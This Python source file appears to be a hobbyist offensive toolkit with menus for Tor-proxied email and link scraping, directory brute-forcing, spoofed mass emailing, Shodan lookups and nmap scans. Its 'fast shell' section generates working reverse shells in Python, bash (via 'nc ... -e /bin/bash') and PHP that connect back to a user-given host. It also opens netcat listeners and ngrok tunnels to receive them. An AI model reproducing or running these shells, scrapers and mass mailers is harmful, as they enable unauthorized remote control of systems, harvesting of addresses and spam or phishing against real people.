import requests
from bs4 import BeautifulSoup
import os
import re
import ntpath
import smtplib
from email.mime.text import MIMEText
from googlesearch import search
import shodan
import os.path
from os import path
import sys
import nmap3
import os
from pyngrok import ngrok

os.system('sudo service tor start')

print('''
     __             .__                
    |__|__ __  ____ |__| ___________   
    |  |  |  \/    \|  |/  _ \_  __ \  
    |  |  |  /   |  \  (  <_> )  | \/  
/\__|  |____/|___|  /__|\____/|__|     
\______|          \/                   
    .___                               
  __| _/_______  ________ ____   ____  
 / __ |/ __ \  \/ /  ___// __ \_/ ___\ 
/ /_/ \  ___/\   /\___ \\  ___/\  \___ 
\____ |\___  >\_//____  >\___  >\___  >
     \/    \/         \/     \/     \/ 
   _______________   ________  ____      
  \_____  \   _  \  \_____  \/_   |     
   /  ____/  /_\  \  /  ____/ |   |     
  /       \  \_/   \/       \ |   |     
  \_______ \_____  /\_______ \|___|     
          \/     \/         \/          

              OSINT
 
 by juniordevsec2021
 https://github.com/juniordevsec2021/''')

def function_menu():

    print('[1]ahmia search')
    print('[2]find emails')
    print('[3]email sender')
    print('[4]find links')
    print('[5]file finder')
    print('[6]file downloader')
    print('[7]dir bruteforcer')
    print('[8]google search')
    print('[9]shodan')
    print('[10]nmap')
    print('[11]fast shell')
    print('[0]exit')

    choice = input('Choose:')

    choice = int(choice)

    if choice == 1:
        print(function_darksearch())
    elif choice == 2:
        print(email_finder())
    elif choice == 3:
        print((email_sender()))
    elif choice == 4:
        print(link_finder())
    elif choice == 5:
        print(file_finder())
    elif choice == 6:
        print(downloader())
    elif choice == 7:
        print(find_dir())
    elif choice == 8:
        print(google_search())
    elif choice == 9:
        print(shodan_menu())
    elif choice == 10:
        print(nmap_menu())
    elif choice == 11:
        print(auto_shell)
    elif choice == 0:
        os.system('sudo service tor stop')
        quit()
    else:
        os.system('clear')
        print("You must only select from [1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[0].")
        print("Please try again!")
        function_menu()
        
def function_darksearch():

    os.system('clear')

    session = requests.session()

    session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

    ahmia = 'http://msydqstlz2kzerdg.onion/search/?q='

    search = input('What do you wanna search for ?:')

    url = ahmia + search

    response = session.get(url, allow_redirects=True)

    bs = BeautifulSoup(response.text, 'html.parser')
    for link in bs.find_all('a'):
        if 'href' in link.attrs:
            print(link.attrs['href'])

    function_menu()

def email_finder():

    os.system('clear')

    session = requests.session()

    session.proxies = {'http': 'socks5h://localhost:9050',
                       'https': 'socks5h://localhost:9050'}

    url = input('URL for email searching:')

    response = session.get(url, allow_redirects=True)

    name_pattern = re.compile(r"([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)")

    emails = name_pattern.findall(response.text)

    f = open('emails.txt', "a")
    
    collection = repr(emails)

    f.write(collection)

    f.close()

    emails = set(emails)

    print(*sorted(emails), sep='\n')

    function_menu()

def link_finder():

    os.system('clear')

    session = requests.session()

    session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

    url = input('Enter URL for link searching:')

    response = session.get(url, allow_redirects=True)

    bs = BeautifulSoup(response.text, 'html.parser')
    for link in bs.find_all('a'):
        if 'href' in link.attrs:
            print(link.attrs['href'])

    function_menu()

def downloader():

    session = requests.session()

    session.proxies = {'http': 'socks5h://localhost:9050',
                       'https': 'socks5h://localhost:9050'}

    url = input('Enter URL for file downloading:')

    response = session.get(url, allow_redirects=True)

    name, ext = ntpath.splitext(ntpath.basename(url))

    print(name + ext)

    with open(name + ext, 'wb') as f:

        f.write(response.content)

        function_menu()

def file_finder():

    os.system('clear')

    session = requests.session()

    session.proxies = {'http': 'socks5h://localhost:9050',
                       'https': 'socks5h://localhost:9050'}

    url = input('URL for file searching:')

    response = session.get(url, allow_redirects=True)

    name_pattern = re.compile(r"([a-zA-Z0-9_.+-]+[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)")

    files = name_pattern.findall(response.text)

    files = set(files)

    extension = input("Extension:")

    for ext in files:

        if ext.endswith(extension):

            print(ext)

    function_menu()
def find_dir():
    os.system("clear")
    print('[1]bruteforce over tor')
    print('[2]bruteforce no tor')
    print('[3]main menu')
    print('[0]exit')
    choice = input('Choose:')
    choice = int(choice)
    if choice == 1:
        print(find_dir_over_tor())
    elif choice == 2:
        print(find_dir_no_tor())
    elif choice == 3:
        print(function_menu())
    elif choice == 0:
        os.system('sudo service tor stop')
        quit()
    else:
        os.system('clear')
        print("You must only select from [1],[2].[0].")
        print("Please try again!")
        function_menu()

def find_dir_no_tor():
    os.system('clear')

    session = requests.session()

    url = input('TARGET URL:')

    word_list = input('WORD LIST:')

    with open(word_list, 'r') as file:

        for line in file:

            for word in line.split():

                dirs = (url + word)

                print(dirs)

                response = session.get(dirs, allow_redirects=True)

                if response.status_code == 200:

                    f = open('dirs_found.txt', "a")

                    collection = repr(dirs)

                    f.write(collection)

                    f.close()

                    print(response)
                    print('Found!')
                    print('----------------')
                else:
                    print(response)
                    print('Not found!')
                    print('----------------')

    if function_menu() == None:

        print(function_menu())


def find_dir_over_tor():

    os.system('clear')

    session = requests.session()

    session.proxies = {'http': 'socks5h://localhost:9050',
                       'https': 'socks5h://localhost:9050'}

    url = input('TARGET URL:')

    word_list = input('WORD LIST:')

    with open(word_list, 'r') as file:

        for line in file:

            for word in line.split():

                dirs = (url + word)

                print(dirs)

                response = session.get(dirs, allow_redirects=True)

                if response.status_code == 200:

                    f = open('dirs_found.txt', "a")

                    collection = repr(dirs)

                    f.write(collection)

                    f.close()

                    print(response)
                    print('Found!')
                    print('----------------')
                else:
                    print(response)
                    print('Not found!')
                    print('----------------')

    if function_menu() == None:

        print(function_menu())

def single_email():

    os.system('clear')

    os.system('sudo service postfix start')

    sender = "GR1NCH@HACK.COM"

    receivers = input("Receiver:")

    print('==========================================================')
    print('Press Space to go to new line after the previous is ended!')
    print('==========================================================')

    themessage = input('Message:')

    msg = MIMEText(themessage)

    msg['Subject'] = input('Subject:')
    msg['From'] = input('From:')

    try:
        smtpObj = smtplib.SMTP('localhost', 25)
        smtpObj.sendmail(sender, receivers, msg.as_string())
        print("Sent!")
    except smtplib.SMTPException:
        print("Error: unable to send email")
    function_menu()

def mass_email():

    os.system('clear')

    os.system('sudo service postfix start')

    sender = "GR1NCH@HACK.COM"

    print('==========================================================')
    print('Press Space to go to new line after the previous is ended!')
    print('==========================================================')

    themessage = input('Message:')

    msg = MIMEText(themessage)

    msg['Subject'] = input('Subject:')
    msg['From'] = input('From:')

    word_list = input('EMAIL LIST:')

    with open(word_list, 'r') as file:

        for line in file:

            for word in line.split():
                receivers = word

            try:

                smtpObj = smtplib.SMTP('localhost', 25)
                smtpObj.sendmail(sender, receivers, msg.as_string())
                print(word)
                print("Sent!")

            except smtplib.SMTPException:
                print("Error: unable to send email")
    function_menu()

def email_sender():

    os.system('clear')

    print('[1]single email')
    print('[2]mass email')
    print('[3]main menu')

    choice = input('Choose:')

    choice = int(choice)

    if choice == 1:
        print(single_email())
    elif choice == 2:
        print(mass_email())
    elif choice == 3:
        print(function_menu())
    else:
        os.system('clear')
        print("You must only select from [1],[2].")
        print("Please try again!")
        function_menu()

def google_search():

    os.system('clear')

    url = input('Search for:')

    resultsnumber = int(input('How many results do you want?:'))

    result = search(url, num_results=resultsnumber)

    print(*sorted(result), sep='\n')

    function_menu()

def shodan_menu():
    print('[1]shodan search')
    print('[2]shodan host')
    print('[3]shodan summary')
    print('[4]main menu')
    choice = input('Choose:')
    choice = int(choice)
    if choice == 1:
        print(shodan_search())
    elif choice == 2:
        print(shodan_host())
    elif choice == 3:
        print(shodan_summary())
    elif choice == 4:
        print(function_menu())
    else:
        os.system('clear')
        print("You must only select from [1],[2],[3],[4].")
        print("Please try again!")
        shodan_menu()

def shodan_search():
    if path.exists('shodan_api_key.txt'):
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    else:
        SHODAN_API_KEY = input('insert your API key here:')
        f = open('shodan_api_key.txt', "w")
        f.write(SHODAN_API_KEY)
        f.close()
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    search = input('Search for:')
    try:
        results = api.search(search)
        print('Results found: {}'.format(results['total']))
        for result in results['matches']:
            print('IP: {}'.format(result['ip_str']))
            print(result['data'])
            print('')
    except shodan.APIError as e:
        print('Error: {}'.format(e))
    shodan_menu()
def shodan_host():
    if path.exists('shodan_api_key.txt'):
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    else:
        SHODAN_API_KEY = input('insert your API key here:')
        f = open('shodan_api_key.txt', "w")
        f.write(SHODAN_API_KEY)
        f.close()
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    target = input('Host:')
    host = api.host(target)
    print(host)
    print("""
            IP: {}
            Organization: {}
            Operating System: {}
    """.format(host['ip_str'], host.get('org', 'n/a'), host.get('os', 'n/a')))
    for item in host['data']:
        print("""
                    Port: {}
                    Banner: {}

            """.format(item['port'], item['data']))
        f = open('shodan_host_results.txt', "w")
        final_results = host
        final_results = repr(final_results)
        f.write(final_results)
        f.close()
        print('CVE output saved!')
        shodan_menu()

def shodan_summary():

    if path.exists('shodan_api_key.txt'):
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    else:
        SHODAN_API_KEY = input('insert your API key here:')
        f = open('shodan_api_key.txt', "w")
        f.write(SHODAN_API_KEY)
        f.close()
        with open('shodan_api_key.txt', 'r') as file:
            for line in file:
                for api_key in line.split():
                    api = shodan.Shodan(api_key)
    API_KEY = api_key
    FACETS = [
        'org',
        'domain',
        'port',
        'asn',
        ('country', 3),
    ]
    FACET_TITLES = {
        'org': 'Top 5 Organizations',
        'domain': 'Top 5 Domains',
        'port': 'Top 5 Ports',
        'asn': 'Top 5 Autonomous Systems',
        'country': 'Top 3 Countries',
    }
    try:
        query = input('Search for:')
        result = api.count(query, facets=FACETS)
        print('Shodan Summary Information')
        print('Query: %s' % query)
        print('Total Results: %s\n' % result['total'])
        for facet in result['facets']:
            print(FACET_TITLES[facet])
            for term in result['facets'][facet]:
                print('%s: %s' % (term['value'], term['count']))
            print('')
            shodan_menu()
    except Exception as e:
        print('Error: %s' % e)
        sys.exit(1)
        shodan_menu()


def nmap_top_ports():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    results = nmap.scan_top_ports(host)
    print(results)
    nmap_menu()
def nmap_os_detection():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    os_results = nmap.nmap_os_detection(host)
    print(os_results)
    nmap_menu()
def nmap_dns_brute_script():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    results = nmap.nmap_dns_brute_script(host)
    print(results)
    nmap_menu()
def nmap_service_version():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    version_result = nmap.nmap_version_detection(host)
    print(version_result)
    nmap_menu()
def nmap_list_scan():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    results = nmap.nmap_list_scan(host)
    print(results)
    nmap_menu()
def nmap_subnet_scan():
    nmap = nmap3.Nmap()
    host = input("HOST:")
    results = nmap.nmap_subnet_scan(host)
    print(results)
    nmap_menu()
def nmap_fin_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_fin_scan(host)
    print(result)
    nmap_menu()
def nmap_idle_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_idle_scan(host)
    print(result)
    nmap_menu()
def nmap_ping_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_ping_scan(host)
    print(result)
    nmap_menu()
def nmap_syn_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_syn_scan(host)
    print(result)
    nmap_menu()
def nmap_tcp_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_tcp_scan(host)
    print(result)
    nmap_menu()
def nmap_udp_scan():
    nmap = nmap3.NmapScanTechniques()
    host = input("HOST:")
    result = nmap.nmap_udp_scan(host)
    print(result)
    nmap_menu()
def nmap_portscan_only():
    nmap = nmap3.NmapHostDiscovery()
    host = input("HOST:")
    results = nmap.nmap_portscan_only(host)
    print(results)
    nmap_menu()
def nmap_no_portscan():
    nmap = nmap3.NmapHostDiscovery()
    host = input("HOST:")
    results = nmap.nmap_no_portscan(host)
    print(results)
    nmap_menu()
def nmap_arp_discovery():
    nmap = nmap3.NmapHostDiscovery()
    host = input("HOST:")
    results = nmap.nmap_arp_discovery(host)
    print(results)
    nmap_menu()
def nmap_disable_dns():
    nmap = nmap3.NmapHostDiscovery()
    host = input("HOST:")
    results = nmap.nmap_disable_dns(host)
    print(results)
    nmap_menu()
def nmap_menu():
    print('[1]top ports')
    print('[2]os detection')
    print('[3]dns brute script')
    print('[4]service version')
    print('[5]list scan')
    print('[6]subnet scan')
    print('[7]fin scan')
    print('[8]idle scan')
    print('[9]ping scan')
    print('[10]syn scan')
    print('[11]tcp scan')
    print('[12]udp scan')
    print('[13]host portscan only')
    print('[14]host no portscan')
    print('[15]host arp discovery')
    print('[16]host disable dns')
    print('[17]main menu')
    choice = input('Choose:')
    choice = int(choice)
    if choice == 1:
        print(nmap_top_ports())
    elif choice == 2:
        print(nmap_os_detection())
    elif choice == 3:
        print(nmap_dns_brute_script())
    elif choice == 4:
        print(nmap_service_version())
    elif choice == 5:
        print(nmap_list_scan())
    elif choice == 6:
        print(nmap_subnet_scan())
    elif choice == 7:
        print(nmap_fin_scan())
    elif choice == 8:
        print(nmap_idle_scan())
    elif choice == 9:
        print(nmap_ping_scan())
    elif choice == 10:
        print(nmap_syn_scan())
    elif choice == 11:
        print(nmap_tcp_scan())
    elif choice == 12:
        print(nmap_udp_scan())
    elif choice == 13:
        print(nmap_portscan_only())
    elif choice == 14:
        print(nmap_no_portscan())
    elif choice == 15:
        print(nmap_arp_discovery())
    elif choice == 16:
        print(nmap_disable_dns())
    elif choice == 16:
        print(nmap_menu())
    elif choice == 17:
        print(function_menu())
    else:
        os.system('clear')
        print("You must only select from [1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[12],[13],[14],[15],[16],[17].")
        print("Please try again!")
        nmap_menu()
def auto_shell():
    def ngrok_server():
        os.system("clear")
        if path.exists('authtoken.txt'):
            with open('authtoken.txt', 'r') as file:
                for line in file:
                    for token in line.split():
                        authtoken = token
        else:
            authtoken = input('insert your AUTHTOKEN here:')
            f = open('authtoken.txt', "w")
            f.write(authtoken)
            f.close()
            with open('authtoken.txt', 'r') as file:
                for line in file:
                    for token in line.split():
                        authtoken = token
        ngrok.set_auth_token(authtoken)
        port = input("type PORT:")
        PORT = int(port)
        tcp_tunnel = ngrok.connect(PORT, "tcp")
        print(tcp_tunnel)
        ngrok_process = ngrok.get_ngrok_process()
        try:
            ngrok_process.proc.wait()
        except KeyboardInterrupt:
            print(" Shutting down server.")
            ngrok.kill()

    def netcat():
        os.system("clear")
        port = input("port:")
        os.system("nc -lnvp" + port)
        menu()

    def menu():
        os.system("clear")
        print('[1]ngrok')
        print('[2]netcat')
        print('[3]create shell')
        print('[4]main menu')
        print('[0]exit')
        choice = input('Choose:')
        choice = int(choice)
        if choice == 1:
            os.system('''xdotool key "ctrl+shift+t"; xdotool type "python3 auto_shell.py"; xdotool key Return''')
            os.system('''xdotool key "ctrl+shift+t"; xdotool type "python3 auto_shell.py"; xdotool key Return''')
            print(ngrok_server())
        elif choice == 2:
            print(netcat())
        elif choice == 3:
            print(create_reverse_tcp_shell())
        elif choice == 4:
            print(function_menu())
        elif choice == 0:
            os.system("exit")
        else:
            os.system('clear')
            print("You must only select from [1],[2].[0].")
            print("Please try again!")

    def create_reverse_tcp_shell():
        os.system("clear")
        print('[1]python reverse tcp shell')
        print('[2]bash reverse tcp shell')
        print('[3]php reverse shell')
        print('[0]main menu')
        choice = input('Choose:')
        choice = int(choice)
        if choice == 1:
            print(python_reverse_tcp_shell())
        elif choice == 2:
            print(create_bash_reverse_tcp_shell())
        elif choice == 3:
            print(php_reverse_shell())
        elif choice == 0:
            print(menu())
        else:
            os.system('clear')
            print("You must only select from [1],[2],[3],[0].")
            print("Please try again!")

    def python_reverse_tcp_shell():
        os.system("clear")
        shell_host = input("host:")
        shell_port = input("port:")
        shell = b'''
    import socket
    import subprocess
    import os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'''
        SHELL2 = (("host = '" + shell_host + "'" + "\n") + ("port = " + shell_port + "\n"))
        shell2 = bytes(SHELL2, 'utf-8')
        shell3 = b'''s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])'''
        shellfile = open("reverse_shell.py", 'wb')
        shellfile.write((shell + shell2 + shell3))
        shellfile.close()
        menu()

    def create_bash_reverse_tcp_shell():
        os.system("clear")
        host = input("host:")
        port = input("port:")
        shell = 'nc ' + host + ' ' + port + '  -e /bin/bash'
        revshell = bytes(shell, 'utf-8')
        shellfile = open("reverse_shell.sh", 'wb')
        shellfile.write(revshell)
        shellfile.close()
        os.system("chmod +x reverse_shell.sh")
        menu()

    def php_reverse_shell():
        os.system("clear")
        host = input("host:")
        port = input("port:")
        shell = '''<?php header('Content-Type: text/plain; charset=UTF-8');class Shell{private $ip=null;private $port=null;private $os=null;private $shell=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $options=array();private $buffer=1024;private $clen=0;private $error=false;public function __construct($ip,$port){$this->ip=$ip;$this->port=$port;if(stripos(PHP_OS,'LINUX')!==false){$this->os='LINUX';$this->shell='/bin/sh';}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){$this->os='WINDOWS';$this->shell='cmd.exe';$this->options['bypass_shell']=true;}else{echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";exit(0);}}private function daemonize(){set_time_limit(0);if(!function_exists('pcntl_fork')){echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";}else{if(($pid=pcntl_fork())<0){echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";}else if($pid>0){echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";exit(0);}else if(posix_setsid()<0){echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";}else{echo "DAEMONIZE: Completed successfully!\n";}}umask(0);}private function read($stream,$name,$buffer){if(($data=@fread($stream,$buffer))===false){$this->error=true;echo"STRM_ERROR: Cannot read from ${name}, script will now exit...\n";}return $data;}private function write($stream,$name,$data){if(($bytes=@fwrite($stream,$data))===false){$this->error=true;echo"STRM_ERROR: Cannot write to ${name}, script will now exit...\n";}return $bytes;}private function rw($input,$output,$iname,$oname){while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){echo $data;if($this->os==='WINDOWS'&&$oname==='STDIN'){$this->clen+=strlen($data);}}}private function brw($input,$output,$iname,$oname){$size=fstat($input)['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){$this->offset($input,$iname,$this->clen);$size-=$this->clen;$this->clen=0;}$fragments=ceil($size/$this->buffer);$remainder=$size%$this->buffer;while($fragments&&($data=$this->read($input,$iname,$remainder&&$fragments--==1?$remainder:$this->buffer))&&$this->write($output,$oname,$data)){echo $data;}}private function offset($stream,$name,$offset){while($offset>0&&$this->read($stream,$name,$offset>=$this->buffer?$this->buffer:$offset)){$offset-=$this->buffer;}return $offset>0?false:true;}public function run(){$this->daemonize();$socket=@fsockopen($this->ip,$this->port,$errno,$errstr,30);if(!$socket){echo"SOC_ERROR: {$errno}: {$errstr}\n";}else{stream_set_blocking($socket,false);$process=proc_open($this->shell,$this->descriptorspec,$pipes,'/',null,$this->options);if(!$process){echo "PROC_ERROR: Cannot start the shell\n";}else{foreach($pipes as $pipe){stream_set_blocking($pipe,false);}fwrite($socket,"SOCKET: Shell has connected! PID: ".proc_get_status($process)['pid']."\n");while(!$this->error){if(feof($socket)){echo "SOC_ERROR: Shell connection has been terminated\n";break;}else if(feof($pipes[1])||!proc_get_status($process)['running']){echo "PROC_ERROR: Shell process has been terminated\n";break;}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=stream_select($streams['read'],$streams['write'],$streams['except'],null);if($num_changed_streams===false){echo "STRM_ERROR: stream_select() failed\n";break;}else if($num_changed_streams>0){if($this->os==='LINUX'){if(in_array($socket,$streams['read'])){$this->rw($socket,$pipes[0],'SOCKET','STDIN');}if(in_array($pipes[2],$streams['read'])){$this->rw($pipes[2],$socket,'STDERR','SOCKET');}if(in_array($pipes[1],$streams['read'])){$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($socket,$streams['read'])){$this->rw($socket,$pipes[0],'SOCKET','STDIN');}if(fstat($pipes[2])['size']){$this->brw($pipes[2],$socket,'STDERR','SOCKET');}if(fstat($pipes[1])['size']){$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}foreach($pipes as $pipe){fclose($pipe);}proc_close($process);}fclose($socket);}}}$reverse_shell=new Shell("'''
        shell2 = '''",'''
        shell3 = ''');$reverse_shell->Run(); ?>'''
        endshell = bytes(shell + host + shell2 + port + shell3, 'utf-8')
        shellfile = open("reverse_shell.php", 'wb')
        shellfile.write(endshell)
        shellfile.close()
        menu()
function_menu()







